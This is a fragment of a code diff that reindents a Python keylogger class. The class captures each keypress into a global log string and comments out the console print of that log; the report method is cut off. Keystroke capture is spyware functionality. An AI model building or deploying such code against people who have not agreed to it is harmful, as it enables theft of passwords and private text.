@@ -10,17 +10,17 @@ log = "" #init var for storing keystrokes
 
 class Keylogger: #class names start with capital letter conventionally
     def process_keypress(self, key): #functions inside methods are classes
-    global log #to define global variables
-    try:
-        log = log + str(key.char) #key is of type KeyType and cannot be concat'ed
-    except AttributeError: #AttributeError triggered if special char is used (Space, etc)
-        if key == key.space:
-            log = log + " " #print space rather than Key.space
-         else:
-            log = log + " " + str(key) + " " #add space in between
+        global log #to define global variables
+        try:
+            log = log + str(key.char) #key is of type KeyType and cannot be concat'ed
+        except AttributeError: #AttributeError triggered if special char is used (Space, etc)
+            if key == key.space:
+                log = log + " " #print space rather than Key.space
+             else:
+                log = log + " " + str(key) + " " #add space in between
     #print(key)
     #print(key.char)
-    print(log)
+    #print(log)
 
     def report(self):
         global log
